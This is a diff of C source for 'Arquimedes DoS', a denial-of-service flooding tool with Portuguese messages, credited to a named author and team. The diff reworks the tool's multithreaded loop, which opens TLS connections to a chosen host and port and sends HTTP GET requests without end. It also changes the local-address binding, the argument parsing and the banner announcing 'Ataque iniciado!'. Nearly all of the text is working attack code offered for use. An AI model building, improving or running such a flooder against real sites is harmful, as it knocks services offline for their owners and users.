@@ -8,6 +8,7 @@
 #include <netdb.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
+#include <sys/socket.h>
 
 char *target_host = "example.com";
 int target_port = 443;
@@ -22,28 +23,19 @@ void* flood(void* arg) {
 
     while (1) {
         struct hostent *host = gethostbyname(target_host);
-        if (!host) {
-            fprintf(stderr, "[x] Falha ao resolver %s\n", target_host);
-            continue;
-        }
-
-        int sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock < 0) continue;
-
-        if (local_ip != NULL) {
-            struct sockaddr_in local_addr;
-            memset(&local_addr, 0, sizeof(local_addr));
-            local_addr.sin_family = AF_INET;
-            local_addr.sin_addr.s_addr = inet_addr(local_ip);
-            local_addr.sin_port = htons(local_port);
-            if (bind(sock, (struct sockaddr*)&local_addr, sizeof(local_addr)) < 0) {
-                close(sock);
-                continue;
-            }
-        }
+        if (!host) continue;
 
         struct sockaddr_in addr;
-        memset(&addr, 0, sizeof(addr));
+        int sock = socket(AF_INET, SOCK_STREAM, 0);
+
+        if (local_ip != NULL && local_port != 0) {
+            struct sockaddr_in local_addr;
+            local_addr.sin_family = AF_INET;
+            local_addr.sin_port = htons(local_port);
+            local_addr.sin_addr.s_addr = inet_addr(local_ip);
+            bind(sock, (struct sockaddr*)&local_addr, sizeof(local_addr));
+        }
+
         addr.sin_family = AF_INET;
         addr.sin_port = htons(target_port);
         addr.sin_addr = *((struct in_addr*) host->h_addr);
@@ -57,14 +49,14 @@ void* flood(void* arg) {
         SSL_set_fd(ssl, sock);
         if (SSL_connect(ssl) != -1) {
             char req[1024];
-            snprintf(req, sizeof(req),
-                "GET / HTTP/1.1\r\n"
-                "Host: %s\r\n"
-                "Connection: keep-alive\r\n\r\n", target_host);
-
+            snprintf(req, sizeof(req), "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", target_host);
             SSL_write(ssl, req, strlen(req));
             packet_count++;
-            printf("=> [ATAQUE %d] Enviado para %s:%d\n", packet_count, target_host, target_port);
+            printf("Arquimedes-Dos -> %d pacote%s enviado%s para %s!\n", 
+                   packet_count, 
+                   packet_count == 1 ? "" : "s",
+                   packet_count == 1 ? "" : "s",
+                   target_host);
         }
 
         SSL_shutdown(ssl);
@@ -78,23 +70,32 @@ void* flood(void* arg) {
 
 int main(int argc, char *argv[]) {
     if (argc < 7) {
-        printf("Uso: ./arquimedes -I <host> -p <porta> -t <threads> [-l <ip_local>] [-lp <porta_local>]\n");
+        printf("Uso: ./arquimedes -I <host> -p <porta> -t <threads> [-l <ip_local> -lp <porta_local>]\n");
         return 1;
     }
 
     for (int i = 1; i < argc; i++) {
-        if (strcmp(argv[i], "-I") == 0 && i + 1 < argc) target_host = argv[i + 1];
-        if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) target_port = atoi(argv[i + 1]);
-        if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) threads = atoi(argv[i + 1]);
-        if (strcmp(argv[i], "-l") == 0 && i + 1 < argc) local_ip = argv[i + 1];
-        if (strcmp(argv[i], "-lp") == 0 && i + 1 < argc) local_port = atoi(argv[i + 1]);
+        if (strcmp(argv[i], "-I") == 0) {
+            target_host = argv[i + 1];
+        }
+        if (strcmp(argv[i], "-p") == 0) {
+            target_port = atoi(argv[i + 1]);
+        }
+        if (strcmp(argv[i], "-t") == 0) {
+            threads = atoi(argv[i + 1]);
+        }
+        if (strcmp(argv[i], "-l") == 0) {
+            local_ip = argv[i + 1];
+        }
+        if (strcmp(argv[i], "-lp") == 0) {
+            local_port = atoi(argv[i + 1]);
+        }
     }
 
-    printf("╔═══════════════════════════════╗\n");
-    printf("║     𖤛 Arquimedes DoS 𖤛             ║\n");
-    printf("║   By: Jhon Landembeguer             ║\n");
-    printf("║   Team: Família Flodder Techno      ║\n");
-    printf("╚═══════════════════════════════╝\n\n");
+    printf("\nAtaque iniciado!\n\n");
+    printf("🪓 By - Jhon Lamdenberguer\n");
+    printf("💻 Team - Família Flodder Techno\n");
+    printf("📱 Ferramenta - Arquimedes DoS\n\n");
 
     pthread_t tid[threads];
     for (int i = 0; i < threads; i++) {
